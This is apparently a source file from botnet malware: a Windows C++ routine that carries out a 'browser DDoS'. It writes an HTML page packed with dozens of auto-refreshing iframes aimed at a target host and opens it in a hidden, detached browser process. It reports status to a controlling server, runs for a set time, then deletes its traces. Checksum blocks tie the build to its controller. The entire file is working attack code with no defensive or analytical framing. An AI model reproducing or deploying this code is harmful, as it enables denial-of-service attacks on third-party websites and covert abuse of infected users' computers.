#include "../Includes/includes.h"

#ifdef INCLUDE_DDOS
DWORD WINAPI MassBrowserDdos(LPVOID)
{
#ifdef HTTP_BUILD
    int nLocalTaskId = nCurrentTaskId;
#endif

    char cTargetHost[strlen(cStoreParameter)];
    strcpy(cTargetHost, cStoreParameter);

    DWORD dwLength = dwStoreParameter;

    if(true)
    {
    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 5081+(30*10);
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
        return dwLength = GetRandNum(5);
    // <!-------! CRC AREA STOP !-------!>
    }

    char cFile[MAX_PATH];
    sprintf(cFile, "%s\\browser%li.html", cAppData, ulFileHash);
    DeleteFile(cFile);

    srand(GenerateRandomSeed());

    unsigned short usInstances = GetRandNum(40) + 20;
    unsigned short usFrequency = GetRandNum(6) + 2;

    char cWriteToFile[usInstances * 1000];
    strcpy(cWriteToFile, "<html>\n");

    char cRefreshHtmlScript[50];
    sprintf(cRefreshHtmlScript, "<meta http-equiv=\"refresh\" content=\"%i\">\n", usFrequency);

    strcat(cWriteToFile, cRefreshHtmlScript);

    for(unsigned short us = 0; us < usInstances; us++)
        strcat(cWriteToFile, GetIframe(cTargetHost));

    strcat(cWriteToFile, "</html>\n");

    FILE * pFile;
    pFile = fopen(cFile,"w");

    if(pFile != NULL)
    {
        fputs(cWriteToFile, pFile);
        fclose(pFile);
    }

    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    memset(&si, 0 , sizeof(si));

    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;

    si.wShowWindow = SW_HIDE;
    //si.wShowWindow = SW_SHOW;

    char cStartProcessQuery[MAX_PATH + MAX_PATH + 3];

    char *cBrowserPath = cBrowsers[2];
    if(FileExists(cBrowserPath))
        sprintf(cStartProcessQuery, "%s \"%s\"", cBrowserPath, cFile);
    else
    {
        cBrowserPath = cBrowsers[4];
        if(FileExists(cBrowserPath))
            sprintf(cStartProcessQuery, "%s \"%s\"", cBrowserPath, cFile);
        else
        {
            cBrowserPath = cBrowsers[1];
            if(FileExists(cBrowserPath))
                sprintf(cStartProcessQuery, "%s \"%s\"", cBrowserPath, cFile);
            else
            {
                cBrowserPath = cBrowsers[3];
                sprintf(cStartProcessQuery, "%s \"%s\"", cBrowserPath, cFile);
            }
        }
    }

    char *cBrowser = CheckBrowserType(GetBrowserNumberFromPath(cBrowserPath));

    // <!-------! CRC AREA START !-------!>
    char cCheckString[DEFAULT];
    sprintf(cCheckString, "%s:%i", cServer, usPort);
    char *pcStr = cCheckString;
    unsigned long ulCheck = 5081+(30*10);
    int nCheck;
    while((nCheck = *pcStr++))
        ulCheck = ((ulCheck << 5) + ulCheck) + nCheck;
    if(ulCheck != ulChecksum3)
        cBrowser = NULL;
    // <!-------! CRC AREA STOP !-------!>

    //if(!CreateProcess(NULL, cStartProcessQuery, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi))
    if(!CreateProcess(NULL, cStartProcessQuery, NULL, NULL, FALSE, DETACHED_PROCESS, NULL, NULL, &si, &pi))
    {
#ifndef HTTP_BUILD
        SendBrowserDdosFail(cTargetHost);
#endif
        return 0;
    }
    else
    {
#ifndef HTTP_BUILD
        SendBrowserDdosSuccess(cTargetHost, dwLength, cBrowser);
#else
        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
            Sleep(10000);
#endif
    }

    DWORD dwElapsedSeconds = 0;

    while(true)
    {
        Sleep(1000);
        dwElapsedSeconds++;

        if(!bBrowserDdosBusy)
        {
#ifndef HTTP_BUILD
            SendBrowserDdosStop(cTargetHost);
#endif
            break;
        }
        else if(dwLength == dwElapsedSeconds)
        {
#ifndef HTTP_BUILD
            SendBrowserDdosStop(cTargetHost);
#endif
            break;
        }
    }

    TerminateProcess(pi.hProcess, NULL);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    DeleteFile(cFile);

    bBrowserDdosBusy = FALSE;

    return 1;
}
#endif
